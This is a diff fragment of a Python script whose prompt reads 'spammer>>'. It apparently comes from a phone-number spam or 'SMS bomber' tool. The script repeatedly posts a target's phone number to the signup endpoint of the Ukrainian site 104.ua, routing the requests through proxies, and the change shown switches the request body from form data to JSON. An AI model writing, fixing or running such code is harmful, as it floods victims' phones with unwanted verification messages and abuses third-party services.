@@ -51,7 +51,7 @@ else:
 run = int(console.input('[green]Введите количество повторов (1-25):\n[blue]spammer>> '))
 for _ in track(range(run)):
  try:
-         requests.post("https://account.104.ua/signup/request/create", data={"login": number}, headers=headers, proxies=proxies)#https://ok.104.ua/ua/signup?step=2
+         requests.post("https://account.104.ua/signup/request/create", json={"login": number}, headers=headers, proxies=proxies)#https://ok.104.ua/ua/signup?step=2
          print('104.ua')
  except:
          print('Не доставлено (104.ua)')
